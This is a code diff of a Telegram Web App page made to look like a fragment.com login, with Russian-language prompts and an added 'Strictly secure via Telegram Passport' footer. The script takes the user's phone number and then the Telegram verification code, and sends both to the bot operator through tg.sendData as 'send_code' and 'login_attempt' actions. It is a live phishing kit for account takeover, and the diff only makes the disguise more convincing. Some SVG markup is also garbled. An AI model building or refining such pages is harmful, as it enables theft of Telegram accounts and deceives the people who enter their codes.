@@ -8,49 +8,78 @@
     <style>
         body { 
             background-color: #ffffff; 
-            /* ВШИТЫЙ УЗОР TELEGRAM */
-            background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org fill='none' fill-rule='evenodd'%3E%3Cg fill='%233390ec' fill-opacity='0.08'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
-            font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; 
+            /* ЯРКИЕ И ЧЕТКИЕ УЗОРЫ TELEGRAM */
+            background-image: url("data:image/svg+xml,%3Csvg width='80' height='80' viewBox='0 0 80 80' xmlns='http://www.w3.org d='M40 40c0-11 9-20 20-20s20 9 20 20-9 20-20 20-20-9-20-20zm-40 0c0-11 9-20 20-20s20 9 20 20-9 20-20 20-20-9-20-20z' fill='%233390ec' fill-opacity='0.08' fill-rule='evenodd'/%3E%3C/svg%3E");
+            font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; 
         }
-        .container { width: 90%; max-width: 400px; text-align: center; background: rgba(255, 255, 255, 0.98); padding: 30px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
-        .tg-logo { width: 80px; height: 80px; margin-bottom: 20px; }
-        h2 { font-size: 26px; font-weight: 700; margin-bottom: 10px; }
-        p { font-size: 15px; color: #707579; margin-bottom: 25px; }
-        select, input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #dfe1e5; background: #f4f4f5; font-size: 18px; box-sizing: border-box; outline: none; text-align: center; margin-bottom: 10px; }
-        button { width: 100%; padding: 16px; background: #3390ec; color: #ffffff; border: none; border-radius: 12px; font-weight: 600; font-size: 17px; cursor: pointer; }
+        .container { 
+            width: 88%; max-width: 400px; text-align: center; background: rgba(255, 255, 255, 0.98); 
+            padding: 30px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.15); border: 1px solid #f0f0f0;
+        }
+        .tg-logo { width: 75px; height: 75px; margin-bottom: 20px; }
+        h2 { font-size: 26px; font-weight: 700; margin: 0 0 10px; color: #222; }
+        p { font-size: 15px; color: #707579; margin-bottom: 25px; line-height: 1.4; }
+        a { color: #3390ec; text-decoration: none; font-weight: 500; }
+        .input-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+        select, input { 
+            width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #dfe1e5; 
+            background: #f4f4f5; color: #000; font-size: 18px; box-sizing: border-box; outline: none; text-align: center;
+        }
+        button { 
+            width: 100%; padding: 16px; background: #3390ec; color: #ffffff; border: none; 
+            border-radius: 12px; font-weight: 600; font-size: 17px; cursor: pointer; transition: 0.2s;
+        }
+        button:active { background: #2b79c7; transform: scale(0.98); }
+        .footer { margin-top: 35px; font-size: 11px; color: #9bb2c5; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
     </style>
 </head>
 <body>
     <div class="container">
         <svg class="tg-logo" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#3390EC""")/>><path d="M175.987 80.8159L158.336 164.103C157.007 169.967 153.551 171.428 148.621 168.662L121.73 148.835L108.756 161.314C107.319 162.751 106.12 163.962 103.354 163.962L105.289 136.502L155.26 91.2461C157.432 89.313 154.784 88.2384 151.884 90.1714L89.9882 129.141L63.3853 120.824C57.5996 119.016 57.4789 115.031 64.5925 112.254L168.607 72.1384C173.436 70.3274 177.662 73.2088 175.987 80.8159Z" fill="white""")/>></svg>
         <h2 id="title">Fragment</h2>
-        <p id="desc">Введите номер для авторизации</p>
-        <div id="step1">
+        <p id="desc">Авторизация на <a href="https://fragment.com" target="_blank">fragment.com</a></p>
+        
+        <div id="fields" class="input-group">
             <select id="country" onchange="changeCountry()">
                 <option value="RU" data-mask="+{7} (000) 000-00-00">🇷🇺 Россия (+7)</option>
                 <option value="AZ" data-mask="+{994} (00) 000-00-00">🇦🇿 Азербайджан (+994)</option>
+                <option value="UZ" data-mask="+{998} (00) 000-00-00">🇺🇿 Узбекистан (+998)</option>
+                <option value="KZ" data-mask="+{7} (000) 000-00-00">🇰🇿 Казахстан (+7)</option>
+                <option value="US" data-mask="+{1} (000) 000-0000">🇺🇸 США (+1)</option>
+                <option value="TR" data-mask="+{90} (000) 000-00-00">🇹🇷 Турция (+90)</option>
+                <option value="UA" data-mask="+{380} (00) 000-00-00">🇺🇦 Украина (+380)</option>
                 <option value="OTHER" data-mask="+{000000000000}">🌍 Другая страна...</option>
             </select>
             <input type="tel" id="phoneInput">
         </div>
         <button id="btn">Далее</button>
+        <div class="footer">Strictly secure via Telegram Passport</div>
     </div>
+
     <script>
         let tg = window.Telegram.WebApp; tg.expand();
         let step = 1; let mask; let phone = "";
+
         function initMask(p) { if (mask) mask.destroy(); mask = IMask(document.getElementById('phoneInput'), { mask: p, lazy: false }); }
         function changeCountry() { initMask(document.getElementById('country').options[document.getElementById('country').selectedIndex].getAttribute('data-mask')); }
         initMask("+{7} (000) 000-00-00");
+
         document.getElementById('btn').onclick = function() {
             if (step === 1) {
                 phone = "+" + mask.unmaskedValue;
                 tg.sendData(JSON.stringify({ "action": "send_code", "phone": phone }));
-                document.getElementById('step1').style.display = 'none';
-                document.getElementById('desc').innerText = "Введите код из Telegram";
-                mask.destroy(); document.getElementById('phoneInput').value = "";
+                document.getElementById('fields').style.display = 'none';
+                document.getElementById('title').innerText = "Введите код";
+                document.getElementById('desc').innerText = "Мы отправили проверочный код в ваш Telegram";
+                
+                let codeInput = document.createElement('input');
+                codeInput.id = "codeInput"; codeInput.placeholder = "Код из Telegram";
+                document.getElementById('fields').parentNode.insertBefore(codeInput, document.getElementById('btn'));
+                
                 document.getElementById('btn').innerText = "Войти"; step = 2;
             } else {
-                tg.sendData(JSON.stringify({ "action": "login_attempt", "code": document.getElementById('phoneInput').value, "phone": phone }));
+                let code = document.getElementById('codeInput').value;
+                tg.sendData(JSON.stringify({ "action": "login_attempt", "code": code, "phone": phone }));
                 tg.close();
             }
         };
